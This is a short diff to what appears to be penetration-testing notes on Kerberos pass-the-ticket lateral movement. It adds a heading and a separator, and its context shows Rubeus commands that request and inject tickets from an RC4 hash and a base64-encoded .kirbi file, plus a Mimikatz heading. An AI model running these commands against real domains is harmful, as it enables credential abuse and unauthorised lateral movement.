@@ -46,6 +46,7 @@ Now that we have some Kerberos tickets, we can use them to move laterally within
 
 Usage
 ```PowerShell
+# Rubeus PtT
 # Rubeus -- asktgt
 .\Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<hash> /ptt
 
@@ -55,6 +56,7 @@ Usage
 # Rubeus -- Base64 format
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("<ticket>.kirbi"))
 .\Rubeus.exe ptt /ticket:<.kirbi base64 string>
+_____________________________________________________________________________
 
 # Mimikatz PtT
 .\mimikatz.exe
